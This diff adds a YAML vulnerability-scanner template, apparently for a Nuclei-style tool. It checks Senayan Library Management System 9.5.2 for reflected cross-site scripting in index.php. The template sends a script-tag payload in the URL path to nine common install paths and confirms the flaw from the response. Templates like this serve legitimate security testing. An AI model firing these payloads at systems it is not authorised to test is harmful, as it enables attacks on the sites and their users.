@@ -1,0 +1,39 @@
+id: slims-9-xss-index
+brief:
+    title: Senayan Library Management System v9.5.2 (Bulian) - Cross-Site Scripting
+    by: nblirwn
+    level: medium
+    about: SLiMS 9.5.2 (Bulian) vulnerable to Cross-Site Scripting in index.php. When injected, website will execute the payload repeatedly
+    label:
+        - senayan
+        - xss
+        - slims
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/index.php/%22--%3E<script>alert(document.domain)</script>/index.php'
+        - '{{BaseURL}}/perpustakaan/index.php/%22--%3E<script>alert(document.domain)</script>/index.php'
+        - '{{BaseURL}}/slims/index.php/%22--%3E<script>alert(document.domain)</script>/index.php'
+        - '{{BaseURL}}/perpustakaan/slims/index.php/%22--%3E<script>alert(document.domain)</script>/index.php'
+        - '{{BaseURL}}/e-library/index.php/%22--%3E<script>alert(document.domain)</script>/index.php'
+        - '{{BaseURL}}/perpus/index.php/%22--%3E<script>alert(document.domain)</script>/index.php'
+        - '{{BaseURL}}/digilib/index.php/%22--%3E<script>alert(document.domain)</script>/index.php'
+        - '{{BaseURL}}/bulian/index.php/%22--%3E<script>alert(document.domain)</script>/index.php'
+        - '{{BaseURL}}/library/index.php/%22--%3E<script>alert(document.domain)</script>/index.php'
+      signs:
+        - "on": word
+          has:
+            - <script>alert(document.domain)</script>
+            - SLiMS
+            - name="author
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: content_type
+          need: all
+        - "on": status
+          status:
+            - 200
